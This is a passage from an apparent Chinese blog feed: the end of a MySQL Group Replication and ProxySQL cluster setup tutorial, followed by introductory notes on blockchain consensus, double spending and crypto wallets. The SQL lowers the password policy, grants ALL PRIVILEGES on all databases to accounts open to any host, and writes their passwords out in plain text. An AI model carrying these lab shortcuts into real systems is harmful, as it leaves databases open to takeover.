</span><br></pre></td></tr></table></figure></li><li><p>当两个从节点都运行完毕后，运行下面结果进行验证。如果看到一主两从都是“ONLINE”状态，代表组网成功</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> performance_schema.replication_group_members; </span><br></pre></td></tr></table></figure></li></ul><h2 id="ProxySQL配置"><a href="#ProxySQL配置" class="headerlink" title="ProxySQL配置"></a>ProxySQL配置</h2><ul><li><p>连接到ProxySQL Admin，它是一个伪装为MySQL的ProxySQL服务端</p><p><code>mysql -u admin -padmin -h 127.0.0.1 -P6032 --prompt=&#39;Admin&gt; &#39;</code></p></li><li><p>加入后端节点，从192.168.31.230~232</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mysql_servers(hostgroup_id,hostname,port) <span class="keyword">values</span> (<span class="number">10</span>,<span class="string">&#x27;192.168.31.230&#x27;</span>,<span class="number">3306</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mysql_servers(hostgroup_id,hostname,port) <span class="keyword">values</span> (<span class="number">10</span>,<span class="string">&#x27;192.168.31.231&#x27;</span>,<span class="number">3306</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mysql_servers(hostgroup_id,hostname,port) <span class="keyword">values</span> (<span class="number">10</span>,<span class="string">&#x27;192.168.31.232&#x27;</span>,<span class="number">3306</span>); </span><br><span class="line"></span><br><span class="line">load mysql servers <span class="keyword">to</span> runtime;</span><br><span class="line">save mysql servers <span class="keyword">to</span> disk; </span><br></pre></td></tr></table></figure></li><li><p>在n0节点 192.168.31.230执行创建监控命令，该账户会通过主节点同步到其他从属节点</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> validate_password.policy<span class="operator">=</span><span class="number">0</span>; </span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> validate_password.length<span class="operator">=</span><span class="number">4</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;monitor&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> &quot;monitor@1025&quot;;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;proxysql&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> &quot;proxysql@1025&quot;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;monitor&#x27;</span>@<span class="string">&#x27;%&#x27;</span> ;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;proxysql&#x27;</span>@<span class="string">&#x27;%&#x27;</span> ; </span><br><span class="line"></span><br><span class="line">FLUSH PRIVILEGES; </span><br></pre></td></tr></table></figure></li><li><p>在n0主节点上执行下面语句来创建gr_member_routing_candidate_status视图，这是主从故障切换关键所在</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">use sys;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> my_id() <span class="keyword">RETURNS</span> TEXT(<span class="number">36</span>) <span class="keyword">DETERMINISTIC</span> <span class="keyword">NO</span> <span class="keyword">SQL</span> <span class="keyword">RETURN</span> (<span class="keyword">SELECT</span> @<span class="variable">@global</span>.server_uuid <span class="keyword">as</span> my_id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> gr_member_in_primary_partition() </span><br><span class="line"><span class="keyword">RETURNS</span> <span class="type">VARCHAR</span>(<span class="number">3</span>) </span><br><span class="line"><span class="keyword">DETERMINISTIC</span> </span><br><span class="line"><span class="keyword">BEGIN</span> </span><br><span class="line">   <span class="keyword">RETURN</span> </span><br><span class="line">   (<span class="keyword">SELECT</span> IF( MEMBER_STATE<span class="operator">=</span><span class="string">&#x27;ONLINE&#x27;</span> <span class="keyword">AND</span> ((<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> performance_schema.replication_group_members <span class="keyword">WHERE</span> MEMBER_STATE <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ONLINE&#x27;</span>, <span class="string">&#x27;RECOVERING&#x27;</span>)) <span class="operator">&gt;=</span>  ((<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) </span><br><span class="line">   <span class="keyword">FROM</span> performance_schema.replication_group_members)<span class="operator">/</span><span class="number">2</span>) <span class="operator">=</span> <span class="number">0</span>), <span class="string">&#x27;YES&#x27;</span>, <span class="string">&#x27;NO&#x27;</span> )</span><br><span class="line">            <span class="keyword">FROM</span> performance_schema.replication_group_members</span><br><span class="line">            <span class="keyword">JOIN</span> performance_schema.replication_group_member_stats <span class="keyword">USING</span>(member_id) <span class="keyword">where</span> member_id<span class="operator">=</span>my_id()); </span><br><span class="line"><span class="keyword">END</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> gr_member_routing_candidate_status <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> sys.gr_member_in_primary_partition() <span class="keyword">as</span> viable_candidate, </span><br><span class="line">IF( (<span class="keyword">SELECT</span> (<span class="keyword">SELECT</span> GROUP_CONCAT(variable_value)</span><br><span class="line"><span class="keyword">FROM</span> performance_schema.global_variables</span><br><span class="line"><span class="keyword">WHERE</span> variable_name <span class="keyword">IN</span> (<span class="string">&#x27;read_only&#x27;</span>, <span class="string">&#x27;super_read_only&#x27;</span>)) <span class="operator">!=</span> <span class="string">&#x27;OFF,OFF&#x27;</span>), <span class="string">&#x27;YES&#x27;</span>, <span class="string">&#x27;NO&#x27;</span>) <span class="keyword">as</span> read_only, </span><br><span class="line">Count_Transactions_Remote_In_Applier_Queue <span class="keyword">as</span> transactions_behind, Count_Transactions_in_queue <span class="keyword">as</span> <span class="string">&#x27;transactions_to_cert&#x27;</span> <span class="keyword">from</span> performance_schema.replication_group_member_stats <span class="keyword">where</span> member_id<span class="operator">=</span>my_id(); </span><br></pre></td></tr></table></figure></li><li><p>在ProxySQL中设置监控账号与程序账号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> mysql<span class="operator">-</span>monitor_username<span class="operator">=</span><span class="string">&#x27;monitor&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> mysql<span class="operator">-</span>monitor_password<span class="operator">=</span><span class="string">&#x27;monitor@1025&#x27;</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mysql_users(username,password,active,default_hostgroup,transaction_persistent) <span class="keyword">values</span>(<span class="string">&#x27;proxysql&#x27;</span>,<span class="string">&#x27;proxysql@1025&#x27;</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li><li><p>设置读写组，主负责写、从负责读，当MGR主库切换后，代理自动识别主从。ProxySQL代理每一个后端MGR集群时，都必须为这个MGR定义写组10、备写组20、读组30、离线组40。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mysql_group_replication_hostgroups (writer_hostgroup,backup_writer_hostgroup,reader_hostgroup, offline_hostgroup,active,max_writers,writer_is_also_reader,max_transactions_behind) <span class="keyword">values</span> (<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">100</span>);</span><br></pre></td></tr></table></figure></li><li><p>启用规则</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">load mysql servers <span class="keyword">to</span> runtime; </span><br><span class="line">save mysql servers <span class="keyword">to</span> disk; </span><br><span class="line">load mysql users <span class="keyword">to</span> runtime; </span><br><span class="line">save mysql users <span class="keyword">to</span> disk; </span><br><span class="line">load mysql variables <span class="keyword">to</span> runtime; </span><br><span class="line">save mysql variables <span class="keyword">to</span> disk; </span><br></pre></td></tr></table></figure></li><li><p>状态校验</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> hostgroup_id, hostname, port,status <span class="keyword">from</span> runtime_mysql_servers; </span><br></pre></td></tr></table></figure></li><li><p>配置读写分离规则</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mysql_query_rules(rule_id,active,match_digest,destination_hostgroup,apply)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;^SELECT.*FOR UPDATE$&#x27;</span>,<span class="number">10</span>,<span class="number">1</span>),(<span class="number">2</span>,<span class="number">1</span>,<span class="string">&#x27;^SELECT&#x27;</span>,<span class="number">30</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">load mysql query rules <span class="keyword">to</span> runtime; </span><br><span class="line">save mysql query rules <span class="keyword">to</span> disk; </span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;搭建MGR-ProxySQL集群&quot;&gt;&lt;a href=&quot;#搭建MGR-ProxySQL集群&quot; class=&quot;headerlink&quot; title=&quot;搭建MGR+ProxySQL集群&quot;&gt;&lt;/a&gt;搭建MGR+ProxySQL集群&lt;/h1&gt;&lt;h2 id=&quot;系统配置&quot;&gt;&lt;a </summary>
      
    
    
    
    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
    
    
    <category term="MySQL" scheme="http://blog.hoshinobunny.xyz/tags/MySQL/"/>
    
    <category term="分布式" scheme="http://blog.hoshinobunny.xyz/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
    <category term="ProxySQL" scheme="http://blog.hoshinobunny.xyz/tags/ProxySQL/"/>
    
  </entry>
  
  <entry>
    <title>深入浅出区块链笔记（1-8 区块链基础知识）</title>
    <link href="http://blog.hoshinobunny.xyz/2024/10/28/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E7%AC%94%E8%AE%B0%EF%BC%881-8%EF%BC%89/"/>
    <id>http://blog.hoshinobunny.xyz/2024/10/28/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%8C%BA%E5%9D%97%E9%93%BE%E7%AC%94%E8%AE%B0%EF%BC%881-8%EF%BC%89/</id>
    <published>2024-10-28T09:06:57.000Z</published>
    <updated>2024-11-25T08:42:43.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入浅出区块链笔记（1-8-区块链基础知识）"><a href="#深入浅出区块链笔记（1-8-区块链基础知识）" class="headerlink" title="深入浅出区块链笔记（1-8 区块链基础知识）"></a>深入浅出区块链笔记（1-8 区块链基础知识）</h1><h3 id="区块链是什么？"><a href="#区块链是什么？" class="headerlink" title="区块链是什么？"></a>区块链是什么？</h3><ul><li>区块链首先是一个分布式网络。</li><li>区块链可以帮助多个节点达成共识去记录和token相关的事情。</li><li>区块链可以帮助所有人无门槛地构建属于自己的小经济系统。</li></ul><p>让所有的独立节点想要达成共识去做同一件事情，是区块链在技术上首先要解决的问题，这就是我们常说的共识过程，也是“去中心化”这个概念的直接来源。</p><h3 id="区块链共识机制"><a href="#区块链共识机制" class="headerlink" title="区块链共识机制"></a>区块链共识机制</h3><p>共识机制是区块链是核心的组成要素之一，它决定了区块链的业务吞吐量、交易速度、不可篡改性、准入门槛等等，是最为关键的技术要素之一。</p><p>共识机制主要解决了两个问题：</p><ol><li>谁有权利记账。</li><li>作弊问题。</li></ol><p>在比特币社区，“共识”（consensus）这个词已经跳出了技术的范畴。通常人们在表述一个比特币上的问题时，共识的内涵还包括比特币的使用者、开发者、矿工来达成社区共识的部分，所以“共识”这个词在区块链领域还有些“民主”的味道，不单单是技术领域的“共识”。</p><h3 id="最经典的入门型共识机制：PoW工作量证明"><a href="#最经典的入门型共识机制：PoW工作量证明" class="headerlink" title="最经典的入门型共识机制：PoW工作量证明"></a>最经典的入门型共识机制：PoW工作量证明</h3><p>PoW（Proof of Work）工作量证明可以解决以上两个问题。</p><p>在PoW机制中，计算资源（又称算力）是决定记账权的唯一因素。与之对应的就是计算难度。</p><p>计算难度又称作挖矿难度，计算难度是区块链尾了控制产生答案的速度，比如平均10分钟就有一个答案产生和平均2分钟就有一个答案产生，很明显这是两种不同的计算难度且后者难度更小。</p><h5 id="PoW如何避免作弊者？"><a href="#PoW如何避免作弊者？" class="headerlink" title="PoW如何避免作弊者？"></a>PoW如何避免作弊者？</h5><p>大啊安就是计算资源（算力）。一个作弊者如果想要篡改信封里的交易，首先要获得记账权，也就是装信封的权利。而记账权的唯一因素只有计算资源的大小，如果想粗篡改交易，只能投入大量的计算资源与整个系统中其他所有人进行对抗，这是十分困难的，尤其是在整个系统有一定基础计算资源的情况下。</p><p>PoW 中一个有趣的设计是激励机制，在 PoW 共识机制下，我们假设所有参与者都是理性的，理性的意思就是单纯逐利，不考虑家庭、爱好等其他因素。有了理性的前提，PoW 共识机制会给每个诚实的记账者予以奖励，这个设计可以抗击作弊收益的问题。</p><p>理性的人如果作弊、篡改账本肯定需要投入成本，也就是计算资源，收益是篡改账本获得的收益减去投入成本，这个收益往往小于诚实计算所获得的收益。所以，作弊者在作弊过程中投入的计算资源过大，反而得不偿失。</p><h5 id="解决双花攻击"><a href="#解决双花攻击" class="headerlink" title="解决双花攻击"></a>解决双花攻击</h5><p>双花攻击是指一个代币被花费了两次，这在任意的区块链系统中是不被允许的。如果避免了双花问题，基本就能避免上述作弊中收益过大的问题，因为攻击者首先要窃取到你的私钥，同时又能控制了你的计算资源（算力）。</p><p>所有记账节点都会遵循以下两条规则：</p><p>规则一：一个代币如果已经被花费，那么会被标记成已花费，如果再次接收到这个代币被花费</p><p>的请求，那么记账节点会拒绝打包这笔交易；</p><p>规则二：如果同时接收到两个信封，这两个信封中装的两笔交易出现了一个代币被花费了两次的情况，这种情况也就是我们所说的分叉（Fork），那么选择挖矿难度比较大的那个信封。</p><p>规则一避免了未确认的交易出现双花，规则二基本避免已经确认的交易中（信封中）的双花问题。</p><p>假设作弊者的计算资源（算力）占整个系统的 30%，那么连续两次获得记账权的概率是 9%，看起来作弊的可能性还是挺高的，如果是连续 6 次获得记账权呢？概率直降到万分之七。</p><p>在比特币中，这个 6 也就是 6 次确认，表示连续 6 个块过去了，如果我的交易没有被双花的话，那么它被篡改的可能性将越来越小，最后变得几乎不可能被篡改。这也是区块链不可被篡改说法的由来。</p><p>如果任何作弊者花了大量的成本获取了系统 30% 的计算资源（算力），最后只有万分之七的概率获得篡改的可能性，比起作弊，还不如诚实记账的收益高。</p><h3 id="区块链的数字货币应用方向"><a href="#区块链的数字货币应用方向" class="headerlink" title="区块链的数字货币应用方向"></a>区块链的数字货币应用方向</h3><p>数字货币是区块链的第一大应用类型，可以简单理解为一种无主权、社区自治的货币形式。数字货币的运行则通常是靠社区自治的，所谓社区自治，是指用户、维护者、开发者三种角色共同决定数字货币的发展。</p><h5 id="数字货币的特点"><a href="#数字货币的特点" class="headerlink" title="数字货币的特点"></a>数字货币的特点</h5><ul><li><p>总量透明公开。数字货币的发行是在项目创建之初，是白皮书事先就规定好了的，白皮书通常是一个区块链项目公开发布的一种阐述性文档，其中简述了项目的宗旨和愿景以及设计蓝图。在白皮书中，这个项目总共发行多少数字货币，投资者、用户、矿工能够获得多少也都是事先分配好的。数字货币的总量也分为两种，一种是总量设上限的，另外一种是不设上限的。</p></li><li><p>数字货币缓慢释放。数字货币在分配好不同角色的额度之后，往往不是一下子就能发行完毕的，通常在矿工的那部分是需要靠“挖”才能出来的，这也就是前面我们所说的挖矿，挖矿为数字货币的缓慢释放提供了一种方法。</p></li><li><p>代码执行规则。由于我们在白皮书中规定好了总量和数字货币释放的机制，白皮书的内容会</p><p>成为整个社区的基础共识，所以在项目的主网上线之后，数字货币的释放不再是人为控制，而是在代码层面体现，代码将负责控制数字货币的释放，这里去除了人为操作的因素。</p><p>基本上，所有公有区块链项目都会具备以上特性，可见数字货币和区块链的关系十分紧密。另外，在区块链领域，一个项目的开始运营，就伴随着一个新的数字货币的产生，这个数字货币会成为这个项目的基础代币，也有可能会派生出其他货币。区块链在数字货币上的应用，其“去中心化”“不可篡改”的特性相较于其他，就显得更具有划时代的意义。</p></li></ul><h3 id="比较成熟的应用类型"><a href="#比较成熟的应用类型" class="headerlink" title="比较成熟的应用类型"></a>比较成熟的应用类型</h3><p>任何区块创始项目如果想要活下去，就要先解决钱的问题，也就是融资问题。其实融资模式本身就是一个很成熟的应用——ICO（Initial Coin Offering）。</p><p>ICO的中文名是首次代币发行，又称为区块链众筹，这是一种新型的融资模式，投资者可以用手中的比特币，或者其它代币投到一些区块链创始项目。一个区块链项目发起之后，如果选择发起 ICO，相比传统融资渠道，项目方会在很短的时间内融到资，且白皮书中规定好的代币将一次性地投放到投资者手里，并在短时间内上线数字资产交易平台。</p><p>数字资产交易平台也具有高流动性，这种高流动性为早期投资者提供了退出条件，这样投资者的投资周期大大缩短，并且可以快速抽身。</p><p>另外一个高产虚拟资产的领域——游戏领域，也是区块链同化的对象。</p><p>除了虚拟资产，实体资产也可以用区块链进行应用，但是目前遇到的难题基本都是实体资产如何与链上区块链的数据进行一一映射。这涉及了数据公证等等环节，实施起来比中心化应用困难很多，比较典型的例子是区块链与供应链结合，解决信息流、资金流、物流，“三流”合一的问题。除了实体资产和虚拟资产，区块链最简单直接的应用还有公证公示领域，不过这里仅仅用到了区块链“不可篡改”的特性。</p><h3 id="数字货币的概念"><a href="#数字货币的概念" class="headerlink" title="数字货币的概念"></a>数字货币的概念</h3><p>数字货币通常是国内的叫法，在国外，它一般称作“加密货币”。数字货币听起来比加密货币更抽象一点，“数字”旨在表现它不同于传统货币的行为，即它可以通过“数字”表现更多自定义的行为。</p><p>数字货币通常是基于区块链技术、在全球范围内公开发行的、并且没有任何国家政府背书的虚拟货币，这种虚拟货币具有“去信任”、“点对点”、“公开记账”、“不可篡改”等特征。</p><h5 id="电子货币"><a href="#电子货币" class="headerlink" title="电子货币"></a>电子货币</h5><p>电子货币和数字货币一样都是无形的，但是电子货币其实就是将法币电子化，例如第三方支付平台，银行卡电子现金，银行大小额支付系统等等。它只是以电子的方式记录了原来法币的账目，从本质上来说，它们仍然需要在多个中心化系统中进行稽核、对账，“电子”本身并没有成为金融的一部分。</p><h5 id="虚拟货币"><a href="#虚拟货币" class="headerlink" title="虚拟货币"></a>虚拟货币</h5><p>虚拟货币通常是由非金融机构发行的非实体货币，大致分为三类。</p><p>综合来看，与法币的“有形”对应，虚拟货币更多地体现在它的“虚拟无形”上，随着互联网的发展，虚拟货币本身也在逐渐发展，从而诞生了更多新的模式与机遇。</p><p>第一类比如游戏代币，通常不与实体经济发生联系。例如在《王者荣耀》这款游戏中，如果你想要得到新的道具，就必须有足够的游戏代币（钻石和点券），这种虚拟货币还有个特征就是封闭性，即只能在这款游戏中使用。</p><p>第二类是积分类，它可以与实体经济发生联系，比如常旅客积分，超市礼品卡，这种虚拟货币也有个特征叫做单向性，即只能流入，而不能流出。</p><p>第三类自然就是我们主要讲的数字货币（加密货币）了，比特币便是其中典型。</p><h5 id="数字货币"><a href="#数字货币" class="headerlink" title="数字货币"></a>数字货币</h5><p>数字货币一般是指公有区块链平台底下的基础代币，该代币被记录在由密码学保证的一套公开账本上，与传统货币不同的是，由于去中心化以及可编程等特性，此种货币具有可自定义行为的属性。</p><p>在比特币中，我们可以定义多重签名交易来实现真正意义上的“由多人共同掌管的机构型账户”。</p><h3 id="传统货币与数字货币"><a href="#传统货币与数字货币" class="headerlink" title="传统货币与数字货币"></a>传统货币与数字货币</h3><h5 id="实名制vs匿名制"><a href="#实名制vs匿名制" class="headerlink" title="实名制vs匿名制"></a>实名制vs匿名制</h5><p>传统货币在支付过程中，除了现金，其他任何方式基本都或多或少地保留了交易者的信息，无论你是个人还是机构，运营商都可以使用这些交易数据来跟踪你的活动。</p><p>而在数字货币领域，这件事就无足轻重了，目前大部分数字货币具有假匿名性，即化名性，所以并不会被查到你自己的私人资料。</p><p>同时，由于区块链上未提供 KYC（Know Your Customer）功能，也就是充分了解你的客户，对账户持有人的强化审查，所以让监管者很难追踪到交易者的信息，也让数字货币成为了黑市交易的温床。</p><p>这样的缺点主要是因为不少公链代币设计中没有加入身份的概念，不过这只是算是一个需求，而不是数字货币本身存在的缺陷。</p><h5 id="中心化vs点对点"><a href="#中心化vs点对点" class="headerlink" title="中心化vs点对点"></a>中心化vs点对点</h5><p>数字货币的发行主体通常是项目发起方，并且会在白皮书中定义好数字货币的发行过程；在主网上线以后，所有的代币会根据一开始设计好的发行过程缓慢释放到市场，这个过程其实就是大家喜闻乐见的“挖矿”过程。</p><p>所以在主网上线以后，即使作为项目发起方，也几乎很难有权利再次修改发行机制，所有人只能以提案的形式递交到社区进行讨论，讨论的最终结果决定了能否被再次修改。</p><p>这个过程其实与民主选举的过程很相似，而在信用货币领域，发行主体通常是央行，央行可以通过货币的政策进行宏观调控，从某种意义上来说，央行模式是中心化的极致体现，而数字货币则属于点对点机制的体现。</p><h5 id="托管型安全性vs自理型安全性"><a href="#托管型安全性vs自理型安全性" class="headerlink" title="托管型安全性vs自理型安全性"></a>托管型安全性vs自理型安全性</h5><p>由于数字货币的交易过程需要网络中每个节点的认可，且每一笔交易都被记录在区块链上，所以历史交易记录永远不用担心丢失或者被篡改。</p><p>只要数字货币基础的加密算法不被攻破，并且保护好私钥，你的资产便是真正意义上、只属于你自己的资产。</p><p>传统货币的交易过程最终是落到银行的，所以银行系统的安全性决定了传统货币在使用过程中的安全阈值，这也表示你的资产是托管在银行的。</p><h5 id="国家内部流通vs广区域流通"><a href="#国家内部流通vs广区域流通" class="headerlink" title="国家内部流通vs广区域流通"></a>国家内部流通vs广区域流通</h5><p>传统货币是有主权的，通常只在主权国家范围内流通；数字货币目前却没有这样的限制，只要你能连上互联网，你就可以随时随地发送交易到任意地域。</p><p>总结来看，数字货币目前也有很大风险，如今还没有比较完整规范的法律法规来约束数字货币的使用者，所以使用数字货币会有较高的法律与投资的风险。</p><h5 id="数字货币的发行过程"><a href="#数字货币的发行过程" class="headerlink" title="数字货币的发行过程"></a>数字货币的发行过程</h5><p>比特币的发行过程是通过挖矿维持的，是依靠矿工挖矿产生比特币。相当于矿工自己就是一个小型的印钞机。</p><p>矿工每挖出一个区块，会产生一个Coinbase 交易，这个 Coinbase 交易相当于凭空产生了币，矿工可以从 Coinbase 获得比特币，作为维护系统的奖励。</p><p>Coinbase 的产出是每 4 年衰减一半的，第一个 4 年是挖出每个块 50 个比特币，第二个 4年的周期就是挖出每块产出 25 个。</p><p>以上逻辑是比特币白皮书和比特币代码规定好的，所有比特币的参与者可以进行验证。并且根据以上逻辑，我们可以画出如下的发行曲线。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/317b20dd77564021d767b0d32e4a138a%E3%80%90%E6%B5%B7%E9%87%8F%E8%B5%84%E6%BA%90%EF%BC%9A666java.com%E3%80%91.png" alt="317b20dd77564021d767b0d32e4a138a 海量资源：666java.com "></p><p>所以数字货币的发行过程可以认为是一个区块链项目的核心利益分配的过程，也是一个社区激励的过程，如何把有限的代币派发给愿意为项目付出的社区人，是考量一个区块链项目运营成熟度的重要指标。</p><h3 id="了解数字货币行情"><a href="#了解数字货币行情" class="headerlink" title="了解数字货币行情"></a>了解数字货币行情</h3><p>数字货币作为区块链的第一大应用，拥有巨大的市场，你可以从<code>coinmarketcap.com </code>上了解几乎所有数字货币的概况。</p><p>如果想了解数字货币行情，可以打开 feixiaohao.com 进行查看，也可以手机下载<code>MyToken</code>或<code>币看</code>。</p><p>这两个 App 的使用方法与股票行情软件非常相似，上面几乎可以查询到所有已经“上市”的数字货币的实时价格与成交量信息。</p><h3 id="什么是数字货币钱包"><a href="#什么是数字货币钱包" class="headerlink" title="什么是数字货币钱包"></a>什么是数字货币钱包</h3><p>数字货币钱包是最贴近用户的区块链程序，数字货币钱包会可以帮你管理数字货币私钥，发送交易，可以显示你的交易历史记录。从用户功能的角度，数字货币钱包比较接近我们日常使用的钱包，它帮助你管理纸币、硬币、信用卡借记卡。</p><p>数字货币钱包作为数字货币的载体，从技术角度来看，数字货币钱包分为三种类型。</p><ol><li>全节点钱包。全节点钱包是指官方发行的一种数字货币钱包版本，这个版本包含了完整的功能需求，挖矿、发送交易、查询交易记录、管理私钥。</li><li>SPV 轻钱包（Simplified Payment Verification）。轻钱包为了用户体验，牺牲了全节点的部分功能，属于全节点钱包的简化版，如挖矿功能、查询交易功能就没有。</li><li>中心化资产托管钱包。这种钱包其实是第三方服务商帮助你打理你的数字货币，找一个中介托管你的数字货币，比较典型的有<code>blockchain.info</code>。</li></ol><p>以上的第 1 种和第 2 种会在各个数字货币的官网出现，属于真正意义上的数字货币钱包，1相比 2 而言，安全性要更高。</p><h5 id="比特币的Electrum钱包"><a href="#比特币的Electrum钱包" class="headerlink" title="比特币的Electrum钱包"></a>比特币的Electrum钱包</h5><p>Electrum钱包主界面：</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/5b533c24abc4241bb0eab8bbacf586c2%E3%80%90%E6%B5%B7%E9%87%8F%E8%B5%84%E6%BA%90%EF%BC%9A666java.com%E3%80%91.png" alt="5b533c24abc4241bb0eab8bbacf586c2 海量资源：666java.com "></p><p>对于钱包程序来说，最重要信息的就是当前区块高度了，区块高度表示了当前你所在区块的序号，序号体现了你是否更新到了最新区块，而最新区块则决定了你能否查询到自己的交易。即规定了你所有交易账单的起始位置。</p><p>我们以 Electrum 钱包为例，点击圆圈中的控件，出现对话框，红框数字就代表了你本地钱包的块高。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/b5611702a84a4202d42f36d5f54a312f%E3%80%90%E6%B5%B7%E9%87%8F%E8%B5%84%E6%BA%90%EF%BC%9A666java.com%E3%80%91.png" alt="b5611702a84a4202d42f36d5f54a312f 海量资源：666java.com "></p><h5 id="钱包文件与钱包账户"><a href="#钱包文件与钱包账户" class="headerlink" title="钱包文件与钱包账户"></a>钱包文件与钱包账户</h5><p>当你第一次安装好钱包以后，使用钱包的第一件事情就是创建账户（或者钱包文件）。一般全节点钱包都支持多账户，尽管有些钱包有账户的概念，有些没有，在逻辑上也可以使用钱包文件替代账户这个概念。</p><p>例如 Electrum 轻钱包采用的是钱包文件，某些全节点钱包采用的是账户。我们用某个币种的钱包为例子，点击创建账户以后，填好用户名密码，会得到如下信息：</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/0969b7a52091bf4ac8b02fe775f9a94c%E3%80%90%E6%B5%B7%E9%87%8F%E8%B5%84%E6%BA%90%EF%BC%9A666java.com%E3%80%91.png" alt="0969b7a52091bf4ac8b02fe775f9a94c 海量资源：666java.com "></p><p>红字部分又称助记词。这种助记词是为了主私钥服务的，主私钥其实是一串非常长的字母和数字组合，无论是人脑记或者笔记都是非常不容易识别的，容易弄错，助记词的有序组成与主私钥是一一对应的。</p><p>如果记录保存好了助记词（红字部分），即使钱包丢失或者被破坏也没有关系，用户可以在其他钱包中导入助记词，依然可以操作资产。所以说在区块链的世界，主私钥和助记词是操作资产的唯一途径，如果丢失，那么资产就丢失，不存在忘记助记词还能找回资产这回事。</p><p>我们来看看比特币的助记词，我们点击左上角 文件 - 新建 &#x2F; 恢复 ，一直下一步直到出现 12 个单词（暂时不必理会每一步中的选项，不同选项代表不同格式的钱包文件），这 12个单词也是助记词，只要保存好了助记词，你的比特币可以在任意（标准版）比特币钱包导入。</p><p>比特币钱包助记词：</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/eaccfa66fb354fea95b5ba07c147c943%E3%80%90%E6%B5%B7%E9%87%8F%E8%B5%84%E6%BA%90%EF%BC%9A666java.com%E3%80%91.png" 